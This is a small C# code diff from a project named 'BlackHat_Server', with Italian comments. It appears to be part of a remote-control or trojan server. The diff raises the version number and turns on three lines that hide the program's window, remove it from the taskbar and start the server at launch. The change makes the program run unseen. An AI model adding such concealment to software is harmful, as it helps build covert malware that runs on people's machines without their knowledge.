@@ -29,12 +29,12 @@ namespace BlackHat_Server
             
           
             // VERSIONE DEL SERVER
-            ST_Client.Instance.ServerVersion = "0.0.6";
+            ST_Client.Instance.ServerVersion = "0.0.7";
 
-            //this.Hide();
-            //this.ShowInTaskbar = false;
+            this.Hide();
+            this.ShowInTaskbar = false;
 
-            //StartSrv();        
+            StartSrv();        
                    
         }
 
